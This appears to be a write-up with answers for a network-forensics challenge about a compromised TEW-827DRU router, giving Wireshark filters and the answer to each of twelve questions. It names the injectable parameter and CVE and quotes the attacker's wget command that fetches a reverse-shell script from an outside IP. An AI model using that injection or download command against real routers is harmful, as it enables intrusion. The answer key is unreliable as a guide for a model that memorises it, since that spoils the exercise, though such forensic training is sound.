# Trent

## Speech
```
The SOC team has identified suspicious lateral movement targeting router firmware from within the network. Anomalous traffic patterns and command execution have been detected on the router, indicating that an attacker already inside the network has gained unauthorized access and is attempting further exploitation. You will be given network traffic logs from one of the impacted machines. Your task is to conduct a thorough investigation to unravel the attacker's Techniques, Tactics, and Procedures (TTPs).
```

## Questions
1. From what IP address did the attacker initially launched their activity?
192.168.10.2
2. What is the model name of the compromised router?
TEW-827DRU
3. How many failed login attempts did the attacker try before successfully logging into the router?
2
filter on `ip.src == 192.168.10.2 && http` we see POST to /apply_sec which seems to be a connection tenative, after each failed one he GET all the CSS and images of the page bu at the third he ask for other ressource (pandorabox for example)
4. At what UTC time did the attacker successfully log into the routers web admin interface?
2024-05-01 15:53:27
5. How many characters long was the password used to log in successfully?
0
Follow the HTTP stream of the connection
6. What is the current firmware version installed on the compromised router?
2.10
Request `GET /adm_status.asp`
7. Which HTTP parameter was manipulated by the attacker to get remote code execution on the system?
usbapps.config.smb_admin_name
packet 74337, we see a GET to a .sh file, if we follow TCP and go back one stream before we get the code exec
8. What is the CVE number associated with the vulnerability that was exploited in this attack?
CVE-2024-28353
Search for `usbapps.config.smb_admin_name` on google https://oneshell.top/ && https://warp-desk-89d.notion.site/TEW-827DRU-5c40fb20572148f0b00f329d69273791
9. What was the first command the attacker executed by exploiting the vulnerability?
whoami
`ip.src ==192.168.10.2 && http && frame contains "usbapps.config.smb_admin_name"` we can see each command
10. What command did the actor use to initiate the download of a reverse shell to the router from a host outside the network?
wget http://35.159.25.253:8000/a1l4m.sh
11. Multiple attempts to download the reverse shell from an external IP failed. When the actor made a typo in the injection, what response message did the server return?
Access to this resource is forbidden
see the execution of the command bash then the name of the file
12. What was the IP address and port number of the command and control (C2) server when the actor's reverse shell eventually did connect? (IP:Port)
35.159.25.253:41143